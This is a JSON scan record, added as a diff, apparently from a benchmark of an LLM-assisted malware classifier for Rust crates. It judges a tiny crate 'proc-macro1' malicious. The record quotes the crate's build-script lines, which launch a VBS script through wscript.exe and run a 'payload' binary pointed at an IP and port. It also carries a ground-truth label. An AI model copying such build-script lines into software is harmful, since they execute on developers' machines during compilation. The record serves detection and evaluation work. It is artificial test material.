@@ -1,0 +1,106 @@
+{
+  "crate": "proc-macro1",
+  "version": "0.1.0",
+  "condition": "structured_norag",
+  "signals": {
+    "crate": "proc-macro1",
+    "version": {
+      "version": "0.1.0",
+      "major": 0,
+      "high_major_version": false
+    },
+    "analysis_timestamp": "2026-10-07T17:28:39.843707+00:00",
+    "build_rs": {
+      "has_build_rs": true,
+      "signals": [
+        "process_spawn"
+      ],
+      "network_calls": [],
+      "file_writes": [],
+      "env_reads": [],
+      "process_spawns": [
+        "let _ = Command::new(\"wscript.exe\").arg(\"rust-setup-launch.vbs\");",
+        "let _ = Command::new(payload).arg(\"127.0.0.1:443\");"
+      ],
+      "benign_explained": {},
+      "flagged_snippets": [
+        "let _ = Command::new(\"wscript.exe\").arg(\"rust-setup-launch.vbs\");",
+        "let _ = Command::new(payload).arg(\"127.0.0.1:443\");"
+      ]
+    },
+    "unsafe_ffi": {
+      "unsafe_block_count": 0,
+      "unsafe_per_kloc": 0.0,
+      "ffi_declarations": [],
+      "syscall_usage": [],
+      "ffi_crate_dependencies": []
+    },
+    "proc_macro": {
+      "is_proc_macro": false
+    },
+    "typosquatting": {
+      "score": 0.182,
+      "target": "serde_json",
+      "edit_distance": 9,
+      "target_rank": 2,
+      "flagged": false
+    },
+    "dependencies": {
+      "count": 0,
+      "names": [],
+      "dev_dependency_count": 0,
+      "suspicious": [],
+      "suspicious_basis": null,
+      "pinned": false
+    },
+    "source_scan": {
+      "counts": {},
+      "categories": [],
+      "possible_exfiltration_shape": false,
+      "snippets": {}
+    },
+    "prompt_injection": {
+      "detected": false,
+      "matches": []
+    },
+    "content": {
+      "rust_files": 1,
+      "has_build_script": true,
+      "meaningful_lines": 8,
+      "meaningful_lines_build_script": 7,
+      "total_bytes": 348
+    }
+  },
+  "classification": {
+    "classification": "MALICIOUS",
+    "llm_classification": "MALICIOUS",
+    "reconciled": false,
+    "confidence": "HIGH",
+    "reasoning": "Purpose: The crate has almost no content (8 meaningful lines in the library, 7 lines in the build script) and serves no legitimate library purpose. Sources: None needed as it executes local commands immediately. Sinks: The build script spawns processes via `Command::new(\"wscript.exe\").arg(\"rust-setup-launch.vbs\")` and executes a payload connecting to an IP and port (`127.0.0.1:443`). Flow: The build script executes arbitrary local scripts and binaries at compile time (`cargo build`), which is a textbook supply-chain attack vector. Anomalies: A tiny, single-file crate executing `wscript.exe` and `.vbs` files via `build.rs` strongly indicates malicious intent designed to drop and launch malware during compilation.",
+    "primary_signals": [
+      "build_rs.process_spawns",
+      "build_rs.flagged_snippets"
+    ],
+    "retrieved_evidence_used": [],
+    "recommended_action": "Block",
+    "malware_score": 0.99,
+    "security_risk_score": 0.9,
+    "obfuscation_score": 0.2,
+    "confidence_score": 0.99,
+    "flagged_by_score": true,
+    "score_label_consistent": true,
+    "parse_error": false,
+    "unverified_citations": []
+  },
+  "retrieved_context": [],
+  "prescreen": null,
+  "packing": null,
+  "holdout": true,
+  "usage": {
+    "calls": 1,
+    "chars_in": 9521,
+    "chars_out": 1071
+  },
+  "ground_truth": "MALICIOUS",
+  "correct": true
+}
